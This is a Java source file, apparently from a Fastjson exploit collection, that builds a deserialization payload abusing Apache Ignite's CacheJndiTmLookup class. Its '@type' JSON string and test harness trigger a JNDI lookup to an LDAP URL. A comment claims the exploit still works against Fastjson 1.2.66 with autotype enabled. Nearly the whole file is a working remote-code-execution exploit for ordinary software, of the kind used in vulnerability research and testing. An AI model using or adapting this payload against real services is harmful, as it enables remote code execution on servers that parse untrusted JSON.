package fastjsonExp;

import org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup;
import utils.FastjsonVersionCtr;
import utils.StringUtils;

import java.util.ArrayList;
import java.util.List;

/**
 * 已完成
 * org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup
 * still work at fastjson 1.2.66
 */
public class EXP4ignite {

    //payload="{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\",\"jndiNames\":\"ldap://127.0.0.1:1389/run\"}";

    public String JNDI_URL = "";
    public String payload = "{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\",\"jndiNames\":\"replace_here\"}";
    public  void actual_fun(String url){
        CacheJndiTmLookup c =new CacheJndiTmLookup();
        List<String> l = new ArrayList<String>();
        l.add(url);
        c.setJndiNames(l);
        c.getTm();
    }
    public  void actual_fun(){
        if(!StringUtils.isNull(this.JNDI_URL)){
            this.actual_fun(this.JNDI_URL);
        }
    }
    public EXP4ignite(){}
    public EXP4ignite(String uri){
        this.JNDI_URL = uri;
        this.payload = this.payload.replace("replace_here",uri);

    }
    public String getPayload(){
        return this.payload;
    }
    public static void main(String[] args) throws Exception{
        FastjsonVersionCtr myFastjson = new FastjsonVersionCtr("1.2.66");
        myFastjson.mySetAutoType(true);
        EXP4ignite exp = new EXP4ignite("ldap://127.0.0.1:1389/run");
        //myFastjson.myParseObject(exp.getPayload());
        exp.actual_fun();
        myFastjson.clear();

    }


}
